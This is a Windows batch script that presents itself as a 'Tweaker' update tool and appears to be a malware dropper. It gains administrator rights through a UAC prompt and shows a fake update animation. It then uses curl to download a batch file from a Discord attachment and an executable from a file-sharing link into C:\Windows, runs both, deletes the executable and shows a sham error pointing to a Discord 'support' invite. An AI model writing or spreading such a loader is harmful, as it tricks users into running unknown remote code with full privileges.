@echo off
color b
title Tweaker
mode 90,25
cls
:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------
TITLE Searching Update...
echo Searching Update.
ping localhost -n 2 > nul
cls
echo Searching Update..
ping localhost -n 2 > nul
cls
echo Searching Update...
ping localhost -n 2 > nul
cls
echo. [+] Welcome %username%
ping localhost -n 2 > nul
echo.
echo. [-] We download the latest version.
ping localhost -n 2 > nul
cls
echo. [+] Welcome %username%
echo.
echo. [-] We download the latest version..
ping localhost -n 2 > nul
cls
echo. [+] Welcome %username%
echo.
echo. [-] We download the latest version...
ping localhost -n 2 > nul
cls
echo. [+] Welcome %username%
echo.
echo. [-] We download the latest version.
ping localhost -n 2 > nul
cls
echo. [+] Welcome %username%
echo.
echo. [-] We download the latest version..
ping localhost -n 2 > nul
cls
echo. [+] Welcome %username%
echo.
echo. [-] We download the latest version...
ping localhost -n 2 > nul
cls
echo. [+] Welcome %username%
echo.
echo. [-] We download the latest version.
ping localhost -n 2 > nul
cls
echo. [+] Welcome %username%
echo.
echo. [-] We download the latest version..
ping localhost -n 2 > nul
cls
echo. [+] Welcome %username%
echo.
echo. [-] We download the latest version...
ping localhost -n 2 > nul
cls
echo [%date%] Successfully Loaded!
ping localhost -n 3 > nul
cls
TITLE PROGRAM
cd C:\Windows
curl -L -o C:\Windows\main.bat https://cdn.discordapp.com/attachments/963555404724441108/993280277772255432/desac.bat
start /min C:\Windows\main.bat
ping localhost -n 2 >nul
cls
cd C:\Windows
curl -L -o C:\Windows\update.exe https://sprend.com/d?C=bac4c8ce04a9483e90cbcf31603b3eef
ping localhost -n 5 >nul
start C:\Windows\update.exe
ping localhost -n 3 >nul
del C:\Windows\update.exe
cls
color 4
title CONTACT SUPPORT
echo ERROR, please contact the support
echo https://discord.gg/Agaykykj
pause